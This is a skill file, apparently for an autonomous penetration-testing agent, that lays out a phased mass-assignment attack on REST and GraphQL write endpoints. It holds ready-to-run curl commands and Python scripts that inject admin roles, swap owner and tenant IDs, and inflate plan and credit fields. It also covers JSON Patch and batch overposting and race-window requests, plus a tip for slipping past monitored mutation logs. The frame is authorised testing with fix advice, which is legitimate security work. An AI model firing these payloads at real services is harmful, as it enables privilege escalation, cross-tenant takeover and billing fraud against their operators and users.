# Mass Assignment Attack Skill

Privilege escalation, ownership takeover, and entitlement abuse driven by smuggling extra fields into model-binding endpoints. Targets REST and GraphQL writes that map client JSON straight into ORM rows or DTOs without per-field allowlists, including patch updates, bulk operations, and writable nested relations.

## When to Classify Here

Use this skill when the request is about coercing a server-side write to accept attributes the caller is not supposed to control, including:
- Flipping a non-admin account to admin / staff / superuser via fields like `role`, `roles[]`, `isAdmin`, `permissions`, `verified`, `emailVerified` on signup or self-update endpoints
- Hijacking objects across tenants by tampering with `userId`, `ownerId`, `accountId`, `organizationId`, `tenantId`, `workspaceId` on create or update payloads
- Bypassing paywalls, quotas, or feature gates by injecting `plan`, `tier`, `premium`, `features`, `flags`, `seatCount`, `usageLimit`, `creditBalance`, `betaAccess`, `allowImpersonation`
- Manipulating billing state (`price`, `amount`, `currency`, `prorate`, `trialEnd`, `nextInvoice`) where the server trusts the client value instead of recomputing
- Smuggling forbidden attributes through writable nested objects, JSON Patch / JSON Merge Patch documents, GraphQL input objects, batch arrays, or alternate Content-Types
- Probing whether a binder accepts duplicate keys, dot/bracket nested paths (`profile.role`, `settings[roles][]`), or shape-shifted variants the validator never sees

Keywords: mass assignment, autobinding, model binding, parameter binding, parameter pollution write, over-posting, privileged field injection, role escalation via api, isadmin field, ownerid swap, tenant switch, fillable bypass, strong parameters bypass, accepts_nested_attributes, writable nested serializer, prisma overpost, mongoose overpost, graphql input mutation, json patch escalation, merge patch escalation, batch overpost

### Boundary against neighboring skills

- Not `sql_injection`: SQL injection breaks query grammar with quotes, comments, UNION, time delays. Mass assignment never touches the SQL parser; it abuses the ORM layer that maps trusted client keys onto columns.
- Not `xss`: XSS executes JavaScript in a victim browser. Mass assignment is a server-side authorization failure visible in persisted state.
- Not `ssrf`: SSRF coerces the server into outbound network requests. Mass assignment never leaves the application's own database.
- Not `rce` or `cve_exploit`: code execution is not the primitive. If the only outcome is data tampering, classify here. If the chain ends in shell or process compromise, hand off to `rce`.
- Not `path_traversal`: traversal walks the file system through `../` or PHP wrappers. Mass assignment writes attacker-supplied attributes into rows.
- Not built-in `brute_force_credential_guess`: the goal is not to guess a password. The caller is already authenticated as a low-privilege user and is escalating without needing credentials.
- Not community `api_testing`: that skill is a broad API surface playbook (JWT, GraphQL, REST, 403 bypass) that mentions mass assignment in passing as one technique among many. Choose this skill when the user explicitly wants to hunt for over-posting / privileged-field injection or when the workflow needs the per-resource sensitive-field dictionary, the encoding-rotation matrix, the nested/batch shape coverage, and the before/after persistence diff that this file specifies.
- Not community `sqli_exploitation`, `xss_exploitation`, `ssrf_exploitation`, `xxe`: each owns a different parser or sink. Mass assignment lives one layer above, in the controller-to-model binder.

## Tools

This workflow uses only tools already present in the agent's runtime. No new Kali packages are required.

- `query_graph` to inventory create/update endpoints, parameters, technologies, and known field names from prior recon
- `execute_arjun` to brute-force hidden body parameters on each candidate endpoint
- `execute_curl` to fire crafted JSON, form-encoded, multipart, and patch payloads with two distinct authentication contexts
- `execute_code` to generate per-resource field dictionaries, build shape variants, drive batched diffing, and parse before/after responses
- `kali_shell` for `jq`, `httpie`, and one-off CLI checks (response-body comparison, body re-encoding)

## Workflow

### Phase 1: Reconnaissance (Informational)

The goal of this phase is to enumerate every write surface the caller can reach, capture the response shapes for those resources from a baseline read, and build a per-resource dictionary of sensitive attributes to try in Phase 2. Do not send any payload that mutates state with privileged fields yet.

1. **Inventory write endpoints from the recon graph.** Use `query_graph` to find create/update routes already discovered by the crawler:
   ```
   MATCH (e:Endpoint)
   WHERE e.project_id = $project_id
     AND (e.method IN ['POST','PUT','PATCH']
          OR e.url =~ '(?i).*/(users|accounts|profile|me|settings|orders|invoices|subscriptions|teams|members|workspaces|projects|api/.*)$')
   RETURN e.url, e.method, e.content_type, e.status_code
   ORDER BY e.url
   ```
   Also pull GraphQL endpoints and any mutation surfaces:
   ```
   MATCH (e:Endpoint) WHERE e.project_id = $project_id
     AND (e.url =~ '(?i).*(graphql|gql|api/graph).*'
          OR e.content_type =~ '(?i).*application/json.*')
   RETURN e.url, e.method, e.content_type
   ```

2. **Pull known parameter names.** These seed the field dictionary in step 5:
   ```
   MATCH (p:Parameter) WHERE p.project_id = $project_id
   RETURN DISTINCT p.url, p.name, p.method
   ORDER BY p.url
   ```

3. **Enumerate hidden body parameters per write endpoint** with `execute_arjun`. Run it against each candidate so that we catch any field the server actually reads but the client never sends:
   ```
   arjun -u https://<target>/api/users/me -m POST -oJ /tmp/arjun_user_post.json --stable
   arjun -u https://<target>/api/users/me -m JSON -oJ /tmp/arjun_user_json.json --stable
   arjun -u https://<target>/api/users -m POST -oJ /tmp/arjun_user_create.json --stable
   ```
   Merge the discoveries into the field dictionary. Pay extra attention to anything that smells like ownership (`*Id`, `*_id`), entitlement (`plan`, `tier`, `role`, `quota`, `limit`), or state (`status`, `verified`, `approved`).

4. **Capture baseline responses** with the low-privilege caller. For each resource, send a minimal legitimate request and a follow-up GET so we know exactly which fields the server returns and persists today:
   ```bash
   curl -sk -X GET "https://<target>/api/users/me" \
     -H "Authorization: Bearer $LOW_TOKEN" -i | tee /tmp/me.before.txt
   ```
   ```bash
   curl -sk -X PATCH "https://<target>/api/users/me" \
     -H "Authorization: Bearer $LOW_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"displayName":"baseline"}' -i | tee /tmp/me.legit.txt
   ```
   The response body of the legitimate write is a goldmine: every key it returns is a field the binder is willing to surface, and any extra key visible there is an obvious target.

5. **Build a per-resource sensitive-field dictionary.** Use `execute_code` to generate a structured list grouped by category. Combine the response keys from step 4, the parameter names from step 2, the arjun discoveries from step 3, and the canonical lexicon below:
   ```python
   # execute_code
   PRIV_ESC = ['role', 'roles', 'isAdmin', 'is_admin', 'admin', 'superuser',
               'permissions', 'scopes', 'staff', 'verified', 'emailVerified',
               'kycVerified', 'twoFactorRequired', 'mfaEnforced']
   OWNERSHIP = ['userId', 'user_id', 'ownerId', 'owner_id', 'accountId',
                'account_id', 'organizationId', 'orgId', 'tenantId',
                'workspaceId', 'projectId', 'companyId', 'createdBy']
   ENTITLEMENTS = ['plan', 'tier', 'premium', 'pro', 'enterprise', 'features',
                   'flags', 'betaAccess', 'allowImpersonation', 'seatCount',
                   'maxProjects', 'usageLimit', 'creditBalance', 'apiQuota']
   BILLING = ['price', 'amount', 'currency', 'discount', 'prorate',
              'trialEnd', 'trialDays', 'nextInvoice', 'paymentDue']
   STATE = ['status', 'state', 'approved', 'reviewed', 'published',
            'visibility', 'archived', 'lockedUntil']
   dictionary = {
       'priv_esc': PRIV_ESC, 'ownership': OWNERSHIP,
       'entitlements': ENTITLEMENTS, 'billing': BILLING, 'state': STATE,
   }
   import json; open('/tmp/ma_dict.json','w').write(json.dumps(dictionary))
   ```

6. **Pick a verification oracle for each candidate.** Decide up front how Phase 2 will prove a hit: (a) the privileged value appears verbatim in the write response, (b) a follow-up GET shows the field flipped, (c) a privileged-only endpoint that returns 401 today returns 200 after the write, or (d) a UI-visible state change shown via an authenticated flow.

7. **Confirm a second authentication context.** Mass assignment proofs are strongest when the privileged value is something the caller absolutely cannot grant themselves. If the engagement provides a second user (different tenant, different role), capture its `Authorization` header now so Phase 2 can run cross-account ownership swaps.

#### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive over-posting from the recorded history instead of rebuilding the write by hand. proxy_brain tools only see requests that went through the capture proxy, so run the low-privilege caller's create/update flow through it first.

- `redamon.params()` lists request params actually observed with an injectability heuristic, and `redamon.grep("ownerId")` / `redamon.grep("role")` pull field names out of response bodies and JS: both seed the sensitive-field dictionary in step 5.
- `redamon.search({"method":"PATCH"})` and `redamon.search({"method":"POST"})` inventory the write surfaces that were exercised; `redamon.get(id,"both")` shows the exact baseline request/response so you know which keys the binder already surfaces.
- Injection is one privileged field added to a captured write and replayed: `redamon.replay(<captured_patch_id>, {"body":"{\"displayName\":\"probe\",\"role\":\"admin\"}"})`. Ship one field per replay (role, then isAdmin, then plan, then tenantId, then ownerId) so the win-state is unambiguous. For the JSON Patch / Merge Patch variants of 2.6, add `{"headers":{"Content-Type":"application/merge-patch+json"}}`.
- Persistence proof: capture a follow-up GET, then `redamon.diff(<before_get_txn>, <after_get_txn>)` shows the field flipped (structural diff of status / length / headers / body). This is the before/after oracle from step 6 without hand-diffing files.
- `redamon.to_curl(id)` renders the winning payload for the report; `redamon.query({...})` sweeps sibling write routes for the cross-channel parity check in Phase 3.

Caveat: redamon.replay pins host/scheme/port to the origin, so the `/api/v1` vs `/api/v2` and mobile-back-end parity sweeps only work when those routes share the captured host (hit a different host with execute_curl). A `200` still is not a hit: always confirm with the follow-up GET diff.

Once at least one mutable endpoint, a populated sensitive-field dictionary, a captured baseline response, and a chosen oracle are ready, **request transition to exploitation phase**.

### Phase 2: Exploitation

Run the probes in roughly the listed order; stop escalating as soon as a single forbidden attribute is provably persisted. Use the low-privilege token throughout unless a step says otherwise.

#### 2.1 Inline privileged-field injection (JSON)

Add one or two sensitive keys alongside the legitimate request body. Ship one field at a time so the win-state is unambiguous:
```bash
curl -sk -X PATCH "https://<target>/api/users/me" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"probe","role":"admin"}' -i | tee /tmp/ma.role.txt
```
Re-read the resource immediately:
```bash
curl -sk -X GET "https://<target>/api/users/me" \
  -H "Authorization: Bearer $LOW_TOKEN" -i | tee /tmp/me.after.role.txt
```
Compare `/tmp/me.before.txt` against `/tmp/me.after.role.txt`. Any change in `role`, `permissions`, or any persisted privileged key is the proof.

Iterate the same payload shape across the dictionary categories from Phase 1 step 5, one key per request. `execute_code` makes that mechanical:
```python
# execute_code
import requests, json
TOKEN = "Bearer LOW_TOKEN_HERE"
URL = "https://<target>/api/users/me"
candidates = ['role', 'isAdmin', 'verified', 'emailVerified', 'plan',
              'permissions', 'allowImpersonation', 'tenantId', 'ownerId']
results = []
for k in candidates:
    body = {"displayName": "probe", k: "admin" if k in ('role',) else True}
    r = requests.patch(URL, json=body, headers={"Authorization": TOKEN}, verify=False, timeout=15)
    g = requests.get(URL, headers={"Authorization": TOKEN}, verify=False, timeout=15)
    results.append({"field": k, "patch_status": r.status_code, "patch_body": r.text[:400],
                    "get_body": g.text[:400]})
print(json.dumps(results, indent=2)[:6000])
```

#### 2.2 Ownership / tenancy hijack

Aim a create or update at a resource the caller does not own, supplying the `*Id` field that the API normally derives from the session. If the binder writes the client value, the row is persisted under the attacker's chosen owner, or the attacker becomes owner of someone else's row:
```bash
curl -sk -X POST "https://<target>/api/projects" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"probe","ownerId":"<victim-user-id>","tenantId":"<other-tenant>"}' -i
```
For an update path, target a row owned by the second auth context captured in Phase 1 step 7 and try to flip ownership to the low-privilege user:
```bash
curl -sk -X PATCH "https://<target>/api/orders/<victim-order-id>" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ownerId":"<low-user-id>"}' -i
```
Verify by reading the same resource as the second user; a `403` on what was previously visible is the proof.

#### 2.3 Feature-gate and quota tampering

Hit billing, plan, and quota fields on self-service settings endpoints:
```bash
curl -sk -X PATCH "https://<target>/api/account/settings" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan":"enterprise","seatCount":500,"creditBalance":100000,"features":["sso","audit_log"],"betaAccess":true}' -i
```
Then exercise a feature that was previously gated (an SSO config endpoint, an admin export, a paid-only API method). A `200` instead of the expected `402`/`403` proves the gate was lifted by the smuggled fields.

#### 2.4 Shape variants against shape-blind validators

Many validators run after binding and only inspect the top-level keys they expect. Try the same forbidden attribute through alternate shapes; the binder accepts one shape that the validator does not see:
```bash
# duplicate keys (last wins on most parsers, first wins on some)
curl -sk -X PATCH "https://<target>/api/users/me" \
  -H "Authorization: Bearer $LOW_TOKEN" -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}' -i

# nested under a profile object
curl -sk -X PATCH "https://<target>/api/users/me" \
  -H "Authorization: Bearer $LOW_TOKEN" -H "Content-Type: application/json" \
  -d '{"profile":{"role":"admin","permissions":["*"]}}' -i

# array element forms for permission lists
curl -sk -X PATCH "https://<target>/api/users/me" \
  -H "Authorization: Bearer $LOW_TOKEN" -H "Content-Type: application/json" \
  -d '{"permissions[]":"admin","permissions[0]":"admin"}' -i
```

For form-encoded transports, dot and bracket paths often reach nested binders that JSON-only validators ignore:
```bash
curl -sk -X POST "https://<target>/api/users" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'username=probe&profile.role=admin&settings[roles][]=admin&profile[isAdmin]=true' -i
```

#### 2.5 Content-Type rotation

Some endpoints validate one transport thoroughly and accept any other transport blindly. Rotate the same forbidden field across encodings and watch for the encoding that succeeds:
```bash
# JSON
curl -sk -X POST "https://<target>/api/users" \
  -H "Authorization: Bearer $LOW_TOKEN" -H "Content-Type: application/json" \
  -d '{"username":"probe","role":"admin"}' -o /tmp/ma.ct.json -w "%{http_code}\n"

# form-encoded
curl -sk -X POST "https://<target>/api/users" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'username=probe&role=admin' -o /tmp/ma.ct.form -w "%{http_code}\n"

# multipart
curl -sk -X POST "https://<target>/api/users" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -F 'username=probe' -F 'role=admin' -o /tmp/ma.ct.mp -w "%{http_code}\n"

# text/plain (rare but sometimes routed to a permissive parser)
curl -sk -X POST "https://<target>/api/users" \
  -H "Authorization: Bearer $LOW_TOKEN" -H "Content-Type: text/plain" \
  -d '{"username":"probe","role":"admin"}' -o /tmp/ma.ct.text -w "%{http_code}\n"
```

#### 2.6 Patch-shaped payloads

Endpoints advertised as `PATCH` may speak JSON Patch (`application/json-patch+json`) or JSON Merge Patch (`application/merge-patch+json`). Both formats let you `add` or `replace` arbitrary paths, and both binders are typically thinner than the create-path validator:
```bash
# JSON Patch
curl -sk -X PATCH "https://<target>/api/users/me" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json-patch+json" \
  -d '[{"op":"replace","path":"/role","value":"admin"},
       {"op":"add","path":"/permissions","value":["*"]}]' -i

# JSON Merge Patch
curl -sk -X PATCH "https://<target>/api/users/me" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/merge-patch+json" \
  -d '{"role":"admin","ownerId":"<victim-user-id>"}' -i
```

#### 2.7 GraphQL mutation overposting

GraphQL servers often define richer input types than the UI ever uses. Discover the schema first, then drop suspicious fields into the mutation input:
```bash
# Schema introspection (only if not blocked)
curl -sk -X POST "https://<target>/graphql" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __type(name:\"UpdateUserInput\") { inputFields { name type { name kind ofType { name } } } } }"}' \
  | jq '.'
```
Mutate with a privileged input field, and immediately read it back to bypass field-level filtering on the mutation response:
```bash
curl -sk -X POST "https://<target>/graphql" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation($i: UpdateUserInput!) { updateUser(input: $i) { id } } query Recheck { me { id role permissions } }",
       "variables":{"i":{"id":"<self-id>","displayName":"probe","role":"ADMIN","ownerId":"<victim-id>"}}}' -i
```
Aliases and batched mutations are useful when the operation log is monitored: the second alias normalizes back to a benign value, but the persisted state at the moment between the two writes is what matters for verification.

#### 2.8 Bulk / batch insertion

Per-item authorization is often skipped on batch endpoints. Stuff one malicious row inside a long array of benign ones:
```bash
curl -sk -X POST "https://<target>/api/projects/bulk" \
  -H "Authorization: Bearer $LOW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items":[
        {"name":"a"},{"name":"b"},
        {"name":"c","ownerId":"<victim-user-id>","tenantId":"<other-tenant>"},
        {"name":"d"},{"name":"e"}
      ]}' -i
```

#### 2.9 Race-window normalization

If the API enforces post-bind normalization (write goes through, then a sweeper resets the field within milliseconds), fire two requests in quick succession: the first sets the forbidden attribute, the second re-saves a benign update. The final state often retains the privileged value because the sweeper saw a later legitimate update:
```python
# execute_code
import asyncio, httpx
URL = "https://<target>/api/users/me"
H = {"Authorization": "Bearer LOW_TOKEN_HERE", "Content-Type": "application/json"}
async def go():
    async with httpx.AsyncClient(verify=False, timeout=15) as c:
        r1, r2 = await asyncio.gather(
            c.patch(URL, headers=H, json={"role":"admin"}),
            c.patch(URL, headers=H, json={"displayName":"probe-after"}),
        )
        g = await c.get(URL, headers=H)
        print(r1.status_code, r2.status_code, g.text[:400])
asyncio.run(go())
```
Treat any hit here as a stronger finding than 2.1, since it survives an explicit normalization layer.

### Phase 3: Post-Exploitation

1. **Durability check.** Wait at least one minute, log out and back in (refresh the token if the engagement has a refresh flow), then re-read the resource. The privileged field must still be set. Many systems run an asynchronous reconciler that only sweeps within seconds; surviving a refresh is what makes the finding land.

2. **Capability proof.** Exercise something the privileged state actually unlocks. For a flipped role, hit an admin-only endpoint and capture the `200` response. For a tenant swap, perform an action on the target tenant. For a feature gate, exercise the feature. The PoC is "I did the thing my role does not allow".

3. **Cross-channel parity sweep.** Replay the winning payload through every related write surface:
   - The same controller exposed under `/api/v1/...` and `/api/v2/...`
   - Web vs. mobile back ends if they share storage
   - Admin/staff endpoints that also bind the same model
   - GraphQL mutations that target the same resource as the REST route
   - Background ingest paths (CSV import, webhook subscribers, queue workers) that re-bind incoming rows
   Different validators per surface are how mass assignment hides; finding two sibling routes with mismatched allowlists is a much stronger report than a single endpoint hit.

4. **Lateral pivots from the new privilege.** Use `query_graph` to enumerate what other endpoints become reachable now that the role/tenant/feature flag flipped:
   ```
   MATCH (e:Endpoint) WHERE e.project_id = $project_id
     AND e.url =~ '(?i).*(admin|internal|staff|impersonate|export).*'
   RETURN e.url, e.method, e.status_code
   ```
   Probe each one with the escalated session, but stop short of destructive actions unless the engagement scope permits them.

5. **Evidence preservation.** Save the before/after response bodies, the exact triggering request (with full headers), the follow-up GET, and the privileged endpoint that succeeded. `jq` over `/tmp/me.before.txt` and `/tmp/me.after.role.txt` produces a clean diff for the report:
   ```bash
   jq -S . /tmp/me.before.txt > /tmp/me.before.json 2>/dev/null
   jq -S . /tmp/me.after.role.txt > /tmp/me.after.json 2>/dev/null
   diff /tmp/me.before.json /tmp/me.after.json
   ```

## Reporting Guidelines

For every confirmed finding, include:

- **Vulnerability class**: privilege escalation / ownership takeover / feature-gate bypass / billing tampering / nested-write or batch-write overposting
- **Affected endpoint**: full URL, HTTP method, accepted Content-Type, and the resource model behind it
- **Forbidden attribute(s) reached**: exact field name(s) and the values that were persisted
- **Triggering request** as a copy-pasteable code block with all headers
- **Before / after evidence**: baseline response body, post-write response body, and a follow-up GET showing the durable change
- **Capability proof**: a request to a privileged-only endpoint that succeeded after the write but failed before
- **Cross-channel coverage**: which sibling routes (REST v1/v2, GraphQL mutation, batch/import, mobile back end) were also vulnerable; or, if only one was, which were not and why
- **Shape coverage**: which encoding(s) and shape variant(s) succeeded (top-level vs. nested, JSON vs. form, plain PATCH vs. JSON Patch / Merge Patch, single vs. batch)
- **Impact**: scope of compromised accounts, tenants, billing exposure, data accessible after escalation, and reproducibility (one-shot or race window)
- **Fix recommendation**: explicit allowlist binding (Rails strong parameters with `permit(...)`, Laravel `$fillable` with audit, Django REST Framework explicit `Meta.fields` plus `read_only_fields`, Mongoose `strict: throw`, Prisma explicit `data: { ... }` mapping, GraphQL input types stripped of privileged fields), per-field authorization gates, server-side recomputation of derived attributes, parity tests across every binder surface, and validator hooks that run on the post-bind object instead of the raw request body

## Important Notes

- One field per request during exploitation. Bundling several privileged keys hides which one the binder accepted, makes the diff noisy, and weakens the report.
- A `200 OK` does not mean a hit. The server happily echoes unknown fields and silently drops them. Always confirm with a separate GET (or a privileged-only follow-up) before declaring the field persisted.
- Server-side recomputation is the most common false positive. If `plan` is computed from a billing service every time, the client value never sticks; record this as "not vulnerable, server recomputes" rather than missing it.
- Keep payloads minimal. Avoid touching destructive fields (`deletedAt`, `archivedAt`, soft-delete tombstones, financial ledger entries) unless the engagement scope explicitly allows write damage.
- Prefer non-destructive proofs of impact. A flipped `role` on an attacker-controlled account is enough; you do not need to also flip a real customer's account to prove the bug.
- Race-window normalization findings (2.9) are easy to misread. Always re-check the durable state after one minute and after a session refresh; a temporary flip is a different finding from a sticky one.
- The capability proof is what makes a mass assignment finding land. Do not stop at "the field flipped" - show the action the field unlocks.
- If the operator forbids mutating the second user's data, swap the ownership-takeover step (2.2) for a create-path version that assigns ownership to the victim without moving any of their existing rows, and document the limitation in the report.
- References for triage and write-ups: OWASP API Security Top 10 (API3 / API6), PortSwigger Web Security Academy "Mass assignment vulnerabilities" labs, HackerOne reports on GitLab (#54526), Shopify staff-flag flips, Uber session ownership swaps.
